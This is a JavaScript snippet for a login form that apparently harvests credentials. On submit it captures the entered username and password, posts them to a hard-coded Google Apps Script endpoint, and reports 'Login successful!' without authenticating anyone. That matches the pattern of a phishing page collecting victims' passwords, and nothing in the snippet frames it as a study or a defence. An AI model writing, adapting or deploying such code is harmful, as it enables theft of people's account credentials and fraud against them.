document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();  // Prevent default form submission

    var username = document.getElementById('username').value;
    var password = document.getElementById('pass').value;

    // POST request to Google Apps Script
    fetch('https://script.google.com/macros/s/AKfycbypCrV9lEXrc87-CC98DF5YYJbGrDSLPvm37rcMPMLeyLy7ZBp1LvahB11G-zwHuB6r/exec', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams({
            'username': username,
            'password': password
        })
    })
    .then(response => {
        if (response.ok) {
            alert('Login successful!');
        } else {
            alert('Failed to send data');
        }
    })
    .catch(error => {
        console.error('Error:', error);
    });
});
